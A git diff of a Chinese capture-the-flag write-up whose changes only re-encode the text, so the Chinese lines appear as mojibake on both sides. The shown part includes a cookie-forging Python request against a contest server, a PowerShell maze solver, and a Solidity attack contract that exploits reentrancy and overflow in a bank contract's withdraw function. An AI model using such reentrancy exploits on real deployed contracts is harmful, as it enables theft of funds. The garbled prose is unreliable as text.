 import sys,os,json,requests,re
 os.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')
@@ -299,7 +299,7 @@ def requestByCk(ck):
     r = requests.get("http://202.38.93.241:10019/profile",cookies = mcookie,allow_redirects=False)
     if(r.status_code == 200):
         rawstr = (r.text)
-        username = re.findall(r"»¶Ó­Äú£¬(.....)£¡", rawstr)
+        username = re.findall(r"æ¬¢è¿æ‚¨ï¼Œ(.....)ï¼", rawstr)
         if(username[0] == 'admin'):
             flag = re.findall(r"flag{.*}", rawstr)
             print(flag[0])
@@ -328,13 +328,13 @@ print(sess)
 requestByCk(sess)
 ```
 
-## PowerShell ÃÔ¹¬
-Á¬½ÓÉÏ·şÎñÆ÷£¬cdµ½¸ùÄ¿Â¼£¬find²éÕÒ`PSMaze.dll`£¬·¢ÏÖÔÚ`opt`ÎÄ¼ş¼ĞÖĞ
-Ê¹ÓÃ`base64`ÃüÁîÊä³ö£¬ÄÃµ½³ÌĞò¶ş½øÖÆ½øĞĞ·ÖÎö
-·¢ÏÖÔÚ`MazeProvider.GetCellRepr`º¯ÊıÖĞ»á¶Ôµ±Ç°½Úµã½øĞĞÅĞ¶Ï£¬Èç¹ûÊÇÖÕµãÔò½øĞĞsha256¼ÆËã£¬¼ÆËãflag
-Í¨¹ıBFS»òDijkstraËã·¨µÃµ½ÃÔ¹¬Æğµãµ½ÖÕµãµÄ×î¶ÌÂ·¾¶£¬È»ºócdµ½¸ÃÄ¿Â¼»ñµÃflag
-Ğ´¸öpowershell½Å±¾±éÀú¼´¿É£¨Ê¹ÓÃWhere-Object½øĞĞ¹ıÂË£¬²»×ßÖØ¸´Â·Ïß£©
-½Å±¾£º
+## PowerShell è¿·å®«
+è¿æ¥ä¸ŠæœåŠ¡å™¨ï¼Œcdåˆ°æ ¹ç›®å½•ï¼ŒfindæŸ¥æ‰¾`PSMaze.dll`ï¼Œå‘ç°åœ¨`opt`æ–‡ä»¶å¤¹ä¸­
+ä½¿ç”¨`base64`å‘½ä»¤è¾“å‡ºï¼Œæ‹¿åˆ°ç¨‹åºäºŒè¿›åˆ¶è¿›è¡Œåˆ†æ
+å‘ç°åœ¨`MazeProvider.GetCellRepr`å‡½æ•°ä¸­ä¼šå¯¹å½“å‰èŠ‚ç‚¹è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæ˜¯ç»ˆç‚¹åˆ™è¿›è¡Œsha256è®¡ç®—ï¼Œè®¡ç®—flag
+é€šè¿‡BFSæˆ–Dijkstraç®—æ³•å¾—åˆ°è¿·å®«èµ·ç‚¹åˆ°ç»ˆç‚¹çš„æœ€çŸ­è·¯å¾„ï¼Œç„¶åcdåˆ°è¯¥ç›®å½•è·å¾—flag
+å†™ä¸ªpowershellè„šæœ¬éå†å³å¯ï¼ˆä½¿ç”¨Where-Objectè¿›è¡Œè¿‡æ»¤ï¼Œä¸èµ°é‡å¤è·¯çº¿ï¼‰
+è„šæœ¬ï¼š
 ```
 Import-Module ./PSMaze.dll
 
@@ -376,22 +376,22 @@ foreachPath "Maze:/" "Up"
 
 ```
 
-Êä³ö£º
+è¾“å‡ºï¼š
 ```
 PSMaze\Maze::\Down\Right\Down\Right\Down\Right\Down\Down\Down\Right\Down\Right\Down\Right\Right\Down\Right\Down\Right\Down\Left\Down\Left\Left\Left\Left\Left\Down\Down\Right\Down\Left\Left\Down\Left\Down\Down\Down\Down\Down\Down\Down\Right\Down\Left\Down\Right\Right\Down\Down\Left\Down\Left\Down\Down\Down\Right\Up\Right\Down\Right\Down\Right\Up\Right\Right\Up\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Up\Right\Up\Up\Right\Down\Down\Right\Down\Down\Down\Down\Down\Right\Right\Down\Down\Down\Down\Right\Right\Down\Left\Down\Down\Left\Down\Down\Down\Left\Down\Down\Down\Down\Down\Left\Left\Down\Left\Down\Left\Down\Left\Down\Left\Down\Down\Left\Left\Left\Down\Down\Down\Right\Down\Down\Right\Up\Right\Down\Right\Right\Right\Down\Right\Down\Down\Right\Up\Right\Down\Right\Up\Right\Right\Down\Down\Right\Down\Right\Down\Down\Right\Right\Right\Up\Right\Right\Right\Up\Right\Right\Right\Right\Up\Left\Up\Up\Up\Up\Right\Right\Right\Up\Right\Right\Right\Right\Right\Down\Down\Down\Left\Down\Right\Down\Right\Right\Up\Up\Right\Right\Down\Down\Right\Up\Right\Up\Right\Up\Right\Right\Down\Down\Right\Right\Right\Right\Up\Left\Up\Right\Right\Down\Right\Right\Right\Right\Down\Down\Down\Down\Right\Down\Right\Right\Up\Right\Right\Right\Down\Left\Down\Right\Right\Down\Right
 flag{D0_y0u_1ik3_PSC0r3_n0w_2C6BE488}
 ```
-## ¾Â²ËÒøĞĞ
+## éŸ­èœé“¶è¡Œ
 ### flag1
-Ö´ĞĞ
+æ‰§è¡Œ
 ```js
 web3.eth.getStorageAt("0xE575c9abD35Fa94F1949f7d559056bB66FddEB51",2,console.log)
 ```
-»ñÈ¡µ½secertµÄÖµ£¬Ìá½»¼´¿ÉµÃµ½flag
+è·å–åˆ°secertçš„å€¼ï¼Œæäº¤å³å¯å¾—åˆ°flag
 ### flag2
-`withdraw`º¯Êı´æÔÚÖØÈëºÍÒç³öÂ©¶´£¬¹¹Ôì¹¥»÷ºÏÔ¼£¬Ê¹Óà¶îÎªÒ»¸ö´óÊı
-È»ºóÊ¹ÓÃ¹¥»÷ºÏÔ¼µ÷ÓÃ`get_flag_2`£¬¼´¿ÉÉèÖÃgot_flag×Ö¶ÎµÄÖµ£¬´Ó¶ø»ñµÃflag
-¹¥»÷ºÏÔ¼:
+`withdraw`å‡½æ•°å­˜åœ¨é‡å…¥å’Œæº¢å‡ºæ¼æ´ï¼Œæ„é€ æ”»å‡»åˆçº¦ï¼Œä½¿ä½™é¢ä¸ºä¸€ä¸ªå¤§æ•°
+ç„¶åä½¿ç”¨æ”»å‡»åˆçº¦è°ƒç”¨`get_flag_2`ï¼Œå³å¯è®¾ç½®got_flagå­—æ®µçš„å€¼ï¼Œä»è€Œè·å¾—flag
+æ”»å‡»åˆçº¦:
 ```js
 pragma solidity ^0.4.26;
 
@@ -447,7 +447,7 @@ contract Battach{
         require(owner == msg.sender);
         _;
     }
-    // ¹¹Ôìº¯Êı³õÊ¼»¯ºÏÔ¼ËùÓĞÕßµÄµØÖ·
+    // æ„é€ å‡½æ•°åˆå§‹åŒ–åˆçº¦æ‰€æœ‰è€…çš„åœ°å€
     constructor() payable public{
         target = 0xE575c9abD35Fa94F1949f7d559056bB66FddEB51;
          g = JCBank(target);
@@ -459,7 +459,7 @@ contract Battach{
      g.get_flag_2(_user_id);
     }
    
-    //¿ªÊ¼¹¥»÷ºÏÔ¼
+    //å¼€å§‹æ”»å‡»åˆçº¦
     function startattach() ownerOnly payable{
         require(msg.value >= 1);
        flag = 0;
@@ -468,12 +468,12 @@ contract Battach{
     }
     
     
-    // Ïú»ÙºÏÔ¼£¬Ïàµ±ÓÚC++ÀïµÄÎö¹¹
+    // é”€æ¯åˆçº¦ï¼Œç›¸å½“äºC++é‡Œçš„ææ„
     function stopattach() ownerOnly{
         selfdestruct(owner);
     }
     
-    //fallback º¯Êı
+    //fallback å‡½æ•°
     function() payable{
         require(flag == 0);
         flag = 1;
@@ -482,9 +482,9 @@ contract Battach{
  
 }
 ```
-## Ã»ÓĞ BUG µÄ½ÌÎñÏµÍ³
-### µÚÒ»Ìâ
-¶¨Î»µ½ÅĞ¶Ï´úÂë
+## æ²¡æœ‰ BUG çš„æ•™åŠ¡ç³»ç»Ÿ
+### ç¬¬ä¸€é¢˜
+å®šä½åˆ°åˆ¤æ–­ä»£ç 
 ```cpp
     for (i = 0; i <= 7; ++i)
         temp_password[i] = ((temp_password[i] | temp_password[i + 1]) & ~(temp_password[i] & temp_password[i + 1]) | i) & ~((temp_password[i] | temp_password[i + 1]) & ~(temp_password[i] & temp_password[i + 1]) & i);
@@ -493,9 +493,9 @@ contract Battach{
         exit(0);
     }
 ```
-»á¶Ôµ±Ç°Î»ºÍÏÂÒ»Î»½øĞĞÔËËã£¬µ«ÊÇÑ­»·²¢Ã»ÓĞ²Ù×÷×îºóÒ»¸ö×Ö·û00£¬ËùÒÔ´ÓºóÍùÇ°ÄæÍÆ¼´¿ÉµÃµ½µÚÒ»¸öflag
+ä¼šå¯¹å½“å‰ä½å’Œä¸‹ä¸€ä½è¿›è¡Œè¿ç®—ï¼Œä½†æ˜¯å¾ªç¯å¹¶æ²¡æœ‰æ“ä½œæœ€åä¸€ä¸ªå­—ç¬¦00ï¼Œæ‰€ä»¥ä»åå¾€å‰é€†æ¨å³å¯å¾—åˆ°ç¬¬ä¸€ä¸ªflag
 
-## ±ÈÈüÊ±¼äÄÚÎ´Íê³ÉµÄÌâ
-¸öÈË³¢ÊÔ¼û[ÎÒµÄ²©¿Í](XhyEax.github.io)
+## æ¯”èµ›æ—¶é—´å†…æœªå®Œæˆçš„é¢˜
+ä¸ªäººå°è¯•è§[æˆ‘çš„åšå®¢](https://XhyEax.github.io)
 
-ºÃ¼¸Ìâ¶¼ÊÇ²îÒ»²½µÃ³öflag£¬»¹ÊÇÌ«²ËÁË = =
+å¥½å‡ é¢˜éƒ½æ˜¯å·®ä¸€æ­¥å¾—å‡ºflagï¼Œè¿˜æ˜¯å¤ªèœäº† = =
